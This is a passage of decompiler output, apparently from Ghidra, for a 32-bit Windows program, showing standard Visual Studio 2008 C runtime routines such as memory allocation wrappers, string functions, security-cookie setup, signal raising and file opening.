    _Dst = __malloc_crt(_Size);
    if (_Dst != (void *)0x0) {
      _memcpy(_Dst,_Src,_Size);
    }
    FreeEnvironmentStringsW(_Src);
    return _Dst;
  }
  return (LPVOID)0x0;
}



LPWSTR GetCommandLineW(void)

{
  LPWSTR pWVar1;
  
                    // WARNING: Could not recover jumptable at 0x00419683. Too many branches
                    // WARNING: Treating indirect jump as call
  pWVar1 = GetCommandLineW();
  return pWVar1;
}



// WARNING: Removing unreachable block (ram,0x0041969d)
// WARNING: Removing unreachable block (ram,0x004196a3)
// WARNING: Removing unreachable block (ram,0x004196a5)
// Library Function - Single Match
//  __RTC_Initialize
// 
// Library: Visual Studio 2008 Release

void __RTC_Initialize(void)

{
  return;
}



// Library Function - Single Match
//  ___security_init_cookie
// 
// Library: Visual Studio 2008 Release

void __cdecl ___security_init_cookie(void)

{
  DWORD DVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  LARGE_INTEGER local_14;
  _FILETIME local_c;
  
  local_c.dwLowDateTime = 0;
  local_c.dwHighDateTime = 0;
  if ((DAT_0042a044 == 0xbb40e64e) || ((DAT_0042a044 & 0xffff0000) == 0)) {
    GetSystemTimeAsFileTime(&local_c);
    uVar4 = local_c.dwHighDateTime ^ local_c.dwLowDateTime;
    DVar1 = GetCurrentProcessId();
    DVar2 = GetCurrentThreadId();
    DVar3 = GetTickCount();
    QueryPerformanceCounter(&local_14);
    DAT_0042a044 = uVar4 ^ DVar1 ^ DVar2 ^ DVar3 ^ local_14.s.HighPart ^ local_14.s.LowPart;
    if (DAT_0042a044 == 0xbb40e64e) {
      DAT_0042a044 = 0xbb40e64f;
    }
    else if ((DAT_0042a044 & 0xffff0000) == 0) {
      DAT_0042a044 = DAT_0042a044 | DAT_0042a044 << 0x10;
    }
    DAT_0042a048 = ~DAT_0042a044;
  }
  else {
    DAT_0042a048 = ~DAT_0042a044;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0041976b(void)

{
  _DAT_0042d774 = 0;
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_0042c41c == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042c41c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  int *piVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    piVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (piVar1 != (int *)0x0) {
      return piVar1;
    }
    if (DAT_0042c41c == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042c41c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2008 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_0042c41c == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_0042c41c < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_004198c3;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_004198c3:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  private: static void __cdecl type_info::_Type_info_dtor(class type_info *)
// 
// Libraries: Visual Studio 2005 Release, Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl type_info::_Type_info_dtor(type_info *param_1)

{
  int *_Memory;
  int *piVar1;
  int *piVar2;
  
  __lock(0xe);
  _Memory = DAT_0042c424;
  if (*(int *)(param_1 + 4) != 0) {
    piVar1 = (int *)&DAT_0042c420;
    do {
      piVar2 = piVar1;
      if (DAT_0042c424 == (int *)0x0) goto LAB_0041992f;
      piVar1 = DAT_0042c424;
    } while (*DAT_0042c424 != *(int *)(param_1 + 4));
    piVar2[1] = DAT_0042c424[1];
    _free(_Memory);
LAB_0041992f:
    _free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FUN_00419952();
  return;
}



void FUN_00419952(void)

{
  FUN_00413064(0xe);
  return;
}



// Library Function - Single Match
//  _strcmp
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _strcmp(char *_Str1,char *_Str2)

{
  undefined2 uVar1;
  undefined4 uVar2;
  byte bVar3;
  byte bVar4;
  bool bVar5;
  
  if (((uint)_Str1 & 3) != 0) {
    if (((uint)_Str1 & 1) != 0) {
      bVar4 = *_Str1;
      _Str1 = _Str1 + 1;
      bVar5 = bVar4 < (byte)*_Str2;
      if (bVar4 != *_Str2) goto LAB_004199a4;
      _Str2 = _Str2 + 1;
      if (bVar4 == 0) {
        return 0;
      }
      if (((uint)_Str1 & 2) == 0) goto LAB_00419970;
    }
    uVar1 = *(undefined2 *)_Str1;
    _Str1 = (char *)((int)_Str1 + 2);
    bVar4 = (byte)uVar1;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) goto LAB_004199a4;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((ushort)uVar1 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) goto LAB_004199a4;
    if (bVar4 == 0) {
      return 0;
    }
    _Str2 = (char *)((byte *)_Str2 + 2);
  }
LAB_00419970:
  while( true ) {
    uVar2 = *(undefined4 *)_Str1;
    bVar4 = (byte)uVar2;
    bVar5 = bVar4 < (byte)*_Str2;
    if (bVar4 != *_Str2) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 8);
    bVar5 = bVar4 < ((byte *)_Str2)[1];
    if (bVar4 != ((byte *)_Str2)[1]) break;
    if (bVar4 == 0) {
      return 0;
    }
    bVar4 = (byte)((uint)uVar2 >> 0x10);
    bVar5 = bVar4 < ((byte *)_Str2)[2];
    if (bVar4 != ((byte *)_Str2)[2]) break;
    bVar3 = (byte)((uint)uVar2 >> 0x18);
    if (bVar4 == 0) {
      return 0;
    }
    bVar5 = bVar3 < ((byte *)_Str2)[3];
    if (bVar3 != ((byte *)_Str2)[3]) break;
    _Str2 = (char *)((byte *)_Str2 + 4);
    _Str1 = (char *)((int)_Str1 + 4);
    if (bVar3 == 0) {
      return 0;
    }
  }
LAB_004199a4:
  return (uint)bVar5 * -2 + 1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2008 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  uint uVar3;
  size_t local_20;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    sVar2 = 0xffffffff;
  }
  else {
    if (DAT_0042e8b8 == 3) {
      __lock(4);
      uVar3 = ___sbh_find_block((int)_Memory);
      if (uVar3 != 0) {
        local_20 = *(int *)((int)_Memory + -4) - 9;
      }
      FUN_00419a82();
      if (uVar3 != 0) {
        return local_20;
      }
    }
    sVar2 = HeapSize(DAT_0042be74,0,_Memory);
  }
  return sVar2;
}



void FUN_00419a82(void)

{
  FUN_00413064(4);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00419a8b(undefined4 param_1)

{
  _DAT_0042c428 = param_1;
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___crtInitCritSecAndSpinCount
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl ___crtInitCritSecAndSpinCount(LPCRITICAL_SECTION param_1,DWORD param_2)

{
  BOOL BVar1;
  
  BVar1 = InitializeCriticalSectionAndSpinCount(param_1,param_2);
  return BVar1;
}



// Library Function - Single Match
//  __ValidateImageBase
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

BOOL __cdecl __ValidateImageBase(PBYTE pImageBase)

{
  if ((*(short *)pImageBase == 0x5a4d) &&
     (*(int *)(pImageBase + *(int *)(pImageBase + 0x3c)) == 0x4550)) {
    return (uint)(*(short *)((int)(pImageBase + *(int *)(pImageBase + 0x3c)) + 0x18) == 0x10b);
  }
  return 0;
}



// Library Function - Single Match
//  __FindPESection
// 
// Library: Visual Studio 2008 Release

PIMAGE_SECTION_HEADER __cdecl __FindPESection(PBYTE pImageBase,DWORD_PTR rva)

{
  int iVar1;
  PIMAGE_SECTION_HEADER p_Var2;
  uint uVar3;
  
  iVar1 = *(int *)(pImageBase + 0x3c);
  uVar3 = 0;
  p_Var2 = (PIMAGE_SECTION_HEADER)
           (pImageBase + *(ushort *)(pImageBase + iVar1 + 0x14) + 0x18 + iVar1);
  if (*(ushort *)(pImageBase + iVar1 + 6) != 0) {
    do {
      if ((p_Var2->VirtualAddress <= rva) &&
         (rva < (p_Var2->Misc).PhysicalAddress + p_Var2->VirtualAddress)) {
        return p_Var2;
      }
      uVar3 = uVar3 + 1;
      p_Var2 = p_Var2 + 1;
    } while (uVar3 < *(ushort *)(pImageBase + iVar1 + 6));
  }
  return (PIMAGE_SECTION_HEADER)0x0;
}



// Library Function - Single Match
//  __IsNonwritableInCurrentImage
// 
// Library: Visual Studio 2008 Release

BOOL __cdecl __IsNonwritableInCurrentImage(PBYTE pTarget)

{
  uint uVar1;
  BOOL BVar2;
  PIMAGE_SECTION_HEADER p_Var3;
  int **unaff_FS_OFFSET;
  int *local_14;
  code *pcStack_10;
  uint local_c;
  undefined4 local_8;
  
  pcStack_10 = __except_handler4;
  local_14 = *unaff_FS_OFFSET;
  local_c = DAT_0042a044 ^ 0x428d48;
  *unaff_FS_OFFSET = (int *)&local_14;
  local_8 = 0;
  BVar2 = __ValidateImageBase((PBYTE)&IMAGE_DOS_HEADER_00400000);
  if (BVar2 != 0) {
    p_Var3 = __FindPESection((PBYTE)&IMAGE_DOS_HEADER_00400000,(DWORD_PTR)(pTarget + -0x400000));
    if (p_Var3 != (PIMAGE_SECTION_HEADER)0x0) {
      uVar1 = p_Var3->Characteristics;
      *unaff_FS_OFFSET = local_14;
      return ~(uVar1 >> 0x1f) & 1;
    }
  }
  *unaff_FS_OFFSET = local_14;
  return 0;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2008 Release

void __initp_misc_cfltcvt_tab(void)

{
  int *piVar1;
  int iVar2;
  uint uVar3;
  
  uVar3 = 0;
  do {
    piVar1 = (int *)((int)&PTR_LAB_0042ade0 + uVar3);
    iVar2 = __encode_pointer(*piVar1);
    uVar3 = uVar3 + 4;
    *piVar1 = iVar2;
  } while (uVar3 < 0x28);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl terminate(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl terminate(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_terminate != (code *)0x0) {
    (*(code *)p_Var1->_terminate)();
  }
                    // WARNING: Subroutine does not return
  _abort();
}



// Library Function - Single Match
//  void __cdecl unexpected(void)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

void __cdecl unexpected(void)

{
  _ptiddata p_Var1;
  
  p_Var1 = __getptd();
  if ((code *)p_Var1->_unexpected != (code *)0x0) {
    (*(code *)p_Var1->_unexpected)();
  }
  terminate();
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// Library Function - Single Match
//  void __cdecl _inconsistency(void)
// 
// Library: Visual Studio 2008 Release

void __cdecl _inconsistency(void)

{
  code *pcVar1;
  
  pcVar1 = (code *)__decode_pointer(DAT_0042c42c);
  if (pcVar1 != (code *)0x0) {
    (*pcVar1)();
  }
  terminate();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// Library Function - Single Match
//  __initp_eh_hooks
// 
// Library: Visual Studio 2008 Release

void __initp_eh_hooks(void)

{
  DAT_0042c42c = __encode_pointer(0x419c6e);
  return;
}



// Library Function - Single Match
//  __initp_misc_winsig
// 
// Library: Visual Studio 2008 Release

void __cdecl __initp_misc_winsig(undefined4 param_1)

{
  DAT_0042c430 = param_1;
  DAT_0042c434 = param_1;
  DAT_0042c438 = param_1;
  DAT_0042c43c = param_1;
  return;
}



// Library Function - Single Match
//  _siglookup
// 
// Library: Visual Studio 2008 Release

uint __fastcall _siglookup(undefined4 param_1,int param_2,uint param_3)

{
  uint uVar1;
  
  uVar1 = param_3;
  do {
    if (*(int *)(uVar1 + 4) == param_2) break;
    uVar1 = uVar1 + 0xc;
  } while (uVar1 < DAT_0042adcc * 0xc + param_3);
  if ((DAT_0042adcc * 0xc + param_3 <= uVar1) || (*(int *)(uVar1 + 4) != param_2)) {
    uVar1 = 0;
  }
  return uVar1;
}



// Library Function - Single Match
//  ___get_sigabrt
// 
// Library: Visual Studio 2008 Release

_PHNDLR __cdecl ___get_sigabrt(void)

{
  _PHNDLR p_Var1;
  
  p_Var1 = (_PHNDLR)__decode_pointer(DAT_0042c438);
  return p_Var1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _raise
// 
// Library: Visual Studio 2008 Release

int __cdecl _raise(int _SigNum)

{
  uint uVar1;
  int *piVar2;
  code *pcVar3;
  int iVar4;
  code *pcVar5;
  undefined4 extraout_ECX;
  code **ppcVar6;
  _ptiddata p_Var7;
  int local_34;
  void *local_30;
  int local_28;
  int local_20;
  
  p_Var7 = (_ptiddata)0x0;
  local_20 = 0;
  if (_SigNum < 0xc) {
    if (_SigNum != 0xb) {
      if (_SigNum == 2) {
        ppcVar6 = (code **)&DAT_0042c430;
        iVar4 = DAT_0042c430;
        goto LAB_00419e1a;
      }
      if (_SigNum != 4) {
        if (_SigNum == 6) goto LAB_00419df8;
        if (_SigNum != 8) goto LAB_00419ddc;
      }
    }
    p_Var7 = __getptd_noexit();
    if (p_Var7 == (_ptiddata)0x0) {
      return -1;
    }
    uVar1 = _siglookup(extraout_ECX,_SigNum,(uint)p_Var7->_pxcptacttab);
    ppcVar6 = (code **)(uVar1 + 8);
    pcVar3 = *ppcVar6;
  }
  else {
    if (_SigNum == 0xf) {
      ppcVar6 = (code **)&DAT_0042c43c;
      iVar4 = DAT_0042c43c;
    }
    else if (_SigNum == 0x15) {
      ppcVar6 = (code **)&DAT_0042c434;
      iVar4 = DAT_0042c434;
    }
    else {
      if (_SigNum != 0x16) {
LAB_00419ddc:
        piVar2 = __errno();
        *piVar2 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return -1;
      }
LAB_00419df8:
      ppcVar6 = (code **)&DAT_0042c438;
      iVar4 = DAT_0042c438;
    }
LAB_00419e1a:
    local_20 = 1;
    pcVar3 = (code *)__decode_pointer(iVar4);
  }
  iVar4 = 0;
  if (pcVar3 == (code *)0x1) {
    return 0;
  }
  if (pcVar3 == (code *)0x0) {
    iVar4 = __exit(3);
  }
  if (local_20 != iVar4) {
    __lock(iVar4);
  }
  if (((_SigNum == 8) || (_SigNum == 0xb)) || (_SigNum == 4)) {
    local_30 = p_Var7->_tpxcptinfoptrs;
    p_Var7->_tpxcptinfoptrs = (void *)0x0;
    if (_SigNum == 8) {
      local_34 = p_Var7->_tfpecode;
      p_Var7->_tfpecode = 0x8c;
      goto LAB_00419e7e;
    }
  }
  else {
LAB_00419e7e:
    if (_SigNum == 8) {
      for (local_28 = DAT_0042adc0; local_28 < DAT_0042adc4 + DAT_0042adc0; local_28 = local_28 + 1)
      {
        *(undefined4 *)(local_28 * 0xc + 8 + (int)p_Var7->_pxcptacttab) = 0;
      }
      goto LAB_00419eb8;
    }
  }
  pcVar5 = (code *)__encoded_null();
  *ppcVar6 = pcVar5;
LAB_00419eb8:
  FUN_00419ed9();
  if (_SigNum == 8) {
    (*pcVar3)(8,p_Var7->_tfpecode);
  }
  else {
    (*pcVar3)(_SigNum);
    if ((_SigNum != 0xb) && (_SigNum != 4)) {
      return 0;
    }
  }
  p_Var7->_tpxcptinfoptrs = local_30;
  if (_SigNum == 8) {
    p_Var7->_tfpecode = local_34;
  }
  return 0;
}



void FUN_00419ed9(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + -0x1c) != 0) {
    FUN_00413064(0);
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00419f15(undefined4 param_1)

{
  _DAT_0042c444 = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_00419f24(undefined4 param_1)

{
  _DAT_0042c450 = param_1;
  return;
}



// Library Function - Single Match
//  ___crtMessageBoxA
// 
// Library: Visual Studio 2008 Release

int __cdecl ___crtMessageBoxA(LPCSTR _LpText,LPCSTR _LpCaption,UINT _UType)

{
  int iVar1;
  HMODULE hModule;
  FARPROC pFVar2;
  code *pcVar3;
  code *pcVar4;
  int iVar5;
  undefined local_18 [8];
  byte local_10;
  undefined local_c [4];
  int local_8;
  
  iVar1 = __encoded_null();
  local_8 = 0;
  if (DAT_0042c454 == 0) {
    hModule = LoadLibraryA(s_USER32_DLL_00422bb8);
    if (hModule == (HMODULE)0x0) {
      return 0;
    }
    pFVar2 = GetProcAddress(hModule,s_MessageBoxA_00422bac);
    if (pFVar2 == (FARPROC)0x0) {
      return 0;
    }
    DAT_0042c454 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetActiveWindow_00422b9c);
    DAT_0042c458 = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetLastActivePopup_00422b88);
    DAT_0042c45c = __encode_pointer((int)pFVar2);
    pFVar2 = GetProcAddress(hModule,s_GetUserObjectInformationA_00422b6c);
    DAT_0042c464 = __encode_pointer((int)pFVar2);
    if (DAT_0042c464 != 0) {
      pFVar2 = GetProcAddress(hModule,s_GetProcessWindowStation_00422b54);
      DAT_0042c460 = __encode_pointer((int)pFVar2);
    }
  }
  if ((DAT_0042c460 != iVar1) && (DAT_0042c464 != iVar1)) {
    pcVar3 = (code *)__decode_pointer(DAT_0042c460);
    pcVar4 = (code *)__decode_pointer(DAT_0042c464);
    if (((pcVar3 != (code *)0x0) && (pcVar4 != (code *)0x0)) &&
       (((iVar5 = (*pcVar3)(), iVar5 == 0 ||
         (iVar5 = (*pcVar4)(iVar5,1,local_18,0xc,local_c), iVar5 == 0)) || ((local_10 & 1) == 0))))
    {
      _UType = _UType | 0x200000;
      goto LAB_0041a078;
    }
  }
  if ((((DAT_0042c458 != iVar1) &&
       (pcVar3 = (code *)__decode_pointer(DAT_0042c458), pcVar3 != (code *)0x0)) &&
      (local_8 = (*pcVar3)(), local_8 != 0)) &&
     ((DAT_0042c45c != iVar1 &&
      (pcVar3 = (code *)__decode_pointer(DAT_0042c45c), pcVar3 != (code *)0x0)))) {
    local_8 = (*pcVar3)(local_8);
  }
LAB_0041a078:
  pcVar3 = (code *)__decode_pointer(DAT_0042c454);
  if (pcVar3 == (code *)0x0) {
    return 0;
  }
  iVar1 = (*pcVar3)(local_8,_LpText,_LpCaption,_UType);
  return iVar1;
}



// Library Function - Single Match
//  _strncpy_s
// 
// Library: Visual Studio 2008 Release

errno_t __cdecl _strncpy_s(char *_Dst,rsize_t _SizeInBytes,char *_Src,rsize_t _MaxCount)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  rsize_t rVar4;
  errno_t eVar5;
  
  if (_MaxCount == 0) {
    if (_Dst == (char *)0x0) {
      if (_SizeInBytes == 0) {
        return 0;
      }
    }
    else {
LAB_0041a0c5:
      if (_SizeInBytes != 0) {
        if (_MaxCount == 0) {
          *_Dst = '\0';
          return 0;
        }
        if (_Src != (char *)0x0) {
          pcVar3 = _Dst;
          rVar4 = _SizeInBytes;
          if (_MaxCount == 0xffffffff) {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if (cVar1 == '\0') break;
              rVar4 = rVar4 - 1;
            } while (rVar4 != 0);
          }
          else {
            do {
              cVar1 = *_Src;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
              _Src = _Src + 1;
              if ((cVar1 == '\0') || (rVar4 = rVar4 - 1, rVar4 == 0)) break;
              _MaxCount = _MaxCount - 1;
            } while (_MaxCount != 0);
            if (_MaxCount == 0) {
              *pcVar3 = '\0';
            }
          }
          if (rVar4 != 0) {
            return 0;
          }
          if (_MaxCount == 0xffffffff) {
            _Dst[_SizeInBytes - 1] = '\0';
            return 0x50;
          }
          *_Dst = '\0';
          piVar2 = __errno();
          eVar5 = 0x22;
          *piVar2 = 0x22;
          goto LAB_0041a0d6;
        }
        *_Dst = '\0';
      }
    }
  }
  else if (_Dst != (char *)0x0) goto LAB_0041a0c5;
  piVar2 = __errno();
  eVar5 = 0x16;
  *piVar2 = 0x16;
LAB_0041a0d6:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return eVar5;
}



// Library Function - Single Match
//  __set_error_mode
// 
// Library: Visual Studio 2008 Release

int __cdecl __set_error_mode(int _Mode)

{
  int *piVar1;
  int iVar2;
  
  if (-1 < _Mode) {
    if (_Mode < 3) {
      iVar2 = DAT_0042b9d8;
      DAT_0042b9d8 = _Mode;
      return iVar2;
    }
    if (_Mode == 3) {
      return DAT_0042b9d8;
    }
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// Library Function - Single Match
//  __tsopen_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl
__tsopen_nolock(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_28;
  uint local_24;
  HANDLE local_20;
  uint local_1c;
  DWORD local_18;
  uint local_14;
  uint local_10;
  uint local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_24 = 0;
  local_6 = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_24);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_24 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_c = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_c = 0x40000000;
        goto LAB_0041a30b;
      }
    }
    else if (uVar4 != 2) goto LAB_0041a2c7;
    local_c = 0xc0000000;
  }
LAB_0041a30b:
  if (param_4 == 0x10) {
    local_14 = 0;
  }
  else if (param_4 == 0x20) {
    local_14 = 1;
  }
  else if (param_4 == 0x30) {
    local_14 = 2;
  }
  else if (param_4 == 0x40) {
    local_14 = 3;
  }
  else {
    if (param_4 != 0x80) goto LAB_0041a2c7;
    local_14 = (uint)(local_c == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_18 = 3;
    }
    else if (uVar4 == 0x100) {
      local_18 = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_0041a410;
      if (uVar4 != 0x300) goto LAB_0041a2c7;
      local_18 = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_0041a410:
        local_18 = 5;
        goto LAB_0041a3bf;
      }
      if (uVar4 != 0x700) {
LAB_0041a2c7:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        return 0x16;
      }
    }
    local_18 = 1;
  }
LAB_0041a3bf:
  local_10 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_0042be78 & param_5))) {
    local_10 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_10 = local_10 | 0x4000000;
    local_c = local_c | 0x10000;
    local_14 = local_14 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_10 = local_10 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_10 = local_10 | 0x10000000;
    }
  }
  else {
    local_10 = local_10 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    goto LAB_0041a4d8;
  }
  *param_1 = 1;
  local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
  if (local_20 == (HANDLE)0xffffffff) {
    if (((local_c & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_c = local_c & 0x7fffffff;
      local_20 = CreateFileW(param_2,local_c,local_14,&local_38,local_18,local_10,(HANDLE)0x0);
      if (local_20 != (HANDLE)0xffffffff) goto LAB_0041a4e4;
    }
    pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0041a4d8;
  }
LAB_0041a4e4:
  DVar7 = GetFileType(local_20);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_20);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0041a4d8;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_20);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_0042d780)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_0041a859;
